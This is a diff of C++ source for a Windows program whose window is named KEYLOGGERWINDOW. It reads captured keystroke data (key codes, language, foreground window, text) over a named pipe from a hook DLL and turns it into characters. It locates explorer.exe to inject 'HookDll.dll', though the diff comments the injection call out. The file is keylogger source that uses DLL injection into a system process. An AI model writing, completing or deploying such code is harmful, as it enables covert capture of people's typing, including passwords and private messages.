@@ -2,6 +2,12 @@
 #include <Poco/UnicodeConverter.h>
 #include <tchar.h>
 #include <format>
+#include "defines.h"
+#include <Poco/PipeStream.h>
+#include "WindowsPipe.h"
+#include <Poco/Runnable.h>
+#include <Poco/RunnableAdapter.h>
+#include <thread>
 
 using namespace std;
 
@@ -17,10 +23,6 @@ DWORD GetProcessIdByName(const wchar_t* processName) {
                     pid = process.th32ProcessID;
                     break;
                 }
-                /*if (_wcsicmp(process.szExeFile, processName) == 0) {
-                    pid = process.th32ProcessID;
-                    break;
-                }*/
             } while (Process32Next(snapshot, &process));
         }
         CloseHandle(snapshot);
@@ -36,115 +38,92 @@ HookThread::HookThread(Poco::Util::Application* _app, IKeyResover* resolver, IWo
     pBuf = NULL;
 }
 
-void HookThread::HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    /*llr->debug("Hello WorkerThread::HookProc ");*/
+void HookThread::HookProc(KeyInfo receivedInfo) {
 
-    KBDLLHOOKSTRUCT* pKeyboardData = (KBDLLHOOKSTRUCT*)lParam;
+    KBDLLHOOKSTRUCT* pKeyboardData = (KBDLLHOOKSTRUCT*)receivedInfo.plParam;
     //Получим результат нажатой клавиши в символьном ввиде
-    std::wstring result = keyResolver->resolve(nCode, wParam, lParam);
+    std::wstring result = keyResolver->resolve(receivedInfo.lang, receivedInfo.pnCode, receivedInfo.pwParam, receivedInfo.plParam);
 
     if (wordProcessor == NULL) throw std::runtime_error("WordProcessor is NULL");
 
-    HWND window = GetForegroundWindow();
+    //HWND window = GetForegroundWindow();
+    void process(Poco::Util::Application * _app, HWND window, std::string text, std::wstring str);
+    wordProcessor->process(app, receivedInfo.window, receivedInfo.text, result);
 
-    wordProcessor->process(app, window, result);
+    return;
 }
 
-LRESULT HookThread::WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+void HookThread::pipeServerThread()
 {
-    Rpc* pData;
-    //COPYDATASTRUCT* pcds;
-    switch (message)
-    {
-    case WM_CREATE:
-    {
-        // Изменение фильтра сообщения
-        BOOL result = ChangeWindowMessageFilterEx(hWnd, WM_MYMESSAGE, MSGFLT_ALLOW, NULL);
-        if (!result) {
-            DWORD error = GetLastError();
-            // Обработка ошибки
-        }
-        return 0;
-    }
-    case WM_MYMESSAGE:
-        // Извлекаем структуру COPYDATASTRUCT из параметра lParam
-       // pcds = (COPYDATASTRUCT*)lParam;
-        if (!pBuf)break;
-        pData = (Rpc*)pBuf;
-        switch (pData->getFunction()) {
-        case Rpc::HookProc:
-            HookProc(pData->getNCode(), pData->getWParam(), pData->getLParam());
-            //if(data)delete data;
-        }
-        // Если размер данных соответствует ожидаемому размеру, можно привести указатель на блок памяти к типу MyData
-        //if (pcds->cbData == sizeof(Rpc)) {
-        //    Rpc* pData = (Rpc*)pcds->lpData;
+    // Создаем серверный WindowsPipe
+    WindowsPipe serverPipe("mywritepipe", WindowsPipe::PipeMode::Server);
+    // Дожидаемся подключения от сервера
+    serverPipe.waitForConnection();
+    // Создаем PipeInputStream на основе serverPipe
+    Poco::PipeInputStream istr(serverPipe);
 
-        //    switch (pData->getFunction()) {
-        //    case Rpc::HookProc:
-        //        HookProc(pData->getNCode(), pData->getWParam(), pData->getLParam());
-        //        //if(data)delete data;
-        //    }
+    while (!stopFlag) {
+        // Получение размера структуры
+        std::size_t dataSize = 0;
+        istr.read(reinterpret_cast<char*>(&dataSize), sizeof(dataSize));
 
-        //    // Важно: память, выделенную с помощью функции GlobalAlloc, необходимо освободить
-        //    GlobalFree(pcds->lpData);
-        //}
-        //data = (Poco::SharedPtr<Rpc>*)lParam;
-        //switch (data->get()->getFunction()) {
-        //case Rpc::HookProc:
-        //    HookProc(data->get()->getNCode(), data->get()->getWParam(), data->get()->getLParam());
-        //    //if(data)delete data;
-        //}
-        break;
-    default:
-        return DefWindowProc(hWnd, message, wParam, lParam);
+        // Выделение памяти для буфера и чтение данных в буфер
+        char* buffer = new char[dataSize];
+        istr.read(buffer, dataSize);
+
+        // Преобразование буфера в структуру
+        KeyInfo receivedInfo;
+        std::memcpy(&receivedInfo, buffer, dataSize);
+
+        HookProc(receivedInfo);
+
+        // Освобождение памяти, выделенной для буфера
+        delete[] buffer;
     }
-    return 0;
+}
+
+void HookThread::sendCommand() {
+    // Создаем серверный WindowsPipe
+    WindowsPipe clientPipe("myreadpipe", WindowsPipe::PipeMode::Client);
+    // Создаем PipeInputStream на основе serverPipe
+    Poco::PipeOutputStream ostr(clientPipe);
+    ostr << "stop";
+}
+
+void serverThreadFunc()
+{
+
+}
+
+void HookThread::stop() {
+    stopFlag = true;
+    sendCommand();
+    PostQuitMessage(0);
 }
 
 void HookThread::run()
 {
-    
-    HWND hDesktopWindow = GetDesktopWindow();
-    DWORD dwProcessId = 0;
-    GetWindowThreadProcessId(hDesktopWindow, &dwProcessId);
+    //Poco::RunnableAdapter<HookThread> runnable(*this, &HookThread::pipeServerThread);
+    std::thread myThread([this]() {
+        this->pipeServerThread();
+        });
+    myThread.detach();
 
-    //return;
-
-    AdapterWorker<HookThread> adapter(this, &HookThread::WndProc);
+    std::this_thread::sleep_for(std::chrono::seconds(2));
 
     DWORD parentProcessId = GetProcessIdByName(L"explorer");
-
-    HMODULE hModule = GetModuleHandle(NULL);
-    WNDCLASS wc = { 0 };
-    wc.lpfnWndProc = AdapterWorker<HookThread>::WndProc;
-    wc.hInstance = hModule;
-    wc.lpszClassName = L"MyClass";
-    RegisterClass(&wc);
-
-    // создание окна
-    HWND hWnd = CreateWindow(L"MyClass", KEYLOGGERWINDOW, WS_OVERLAPPEDWINDOW,
-        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
-        NULL, NULL, hModule, NULL);
-    ShowWindow(hWnd, SW_SHOWNORMAL);
-    UpdateWindow(hWnd);
 
     std::string appPath = Poco::Path(app->commandPath()).parent().toString();
     std::wstring wstr;
     Poco::UnicodeConverter::toUTF16(appPath, wstr);
     std::wstring resultStr = wstr + L"HookDll.dll";
 
-    // Получить дескриптор главного окна Explorer
-    HWND explorerHwnd = FindWindow(_T("Progman"), _T("Program Manager"));
-    if (explorerHwnd == NULL)
-        explorerHwnd = FindWindow(_T("Shell_TrayWnd"), NULL);
-
-
-    bool result = injectDll(parentProcessId, (WCHAR*)resultStr.c_str());
+    /*bool result = injectDll(parentProcessId, (WCHAR*)resultStr.c_str());
     if (result) {
         logger->error("Cann't inject our Dll!");
+        stop();
         return;
-    }
+    }*/
 
     MSG msg = { };
     while (GetMessage(&msg, NULL, 0, 0) > 0) {
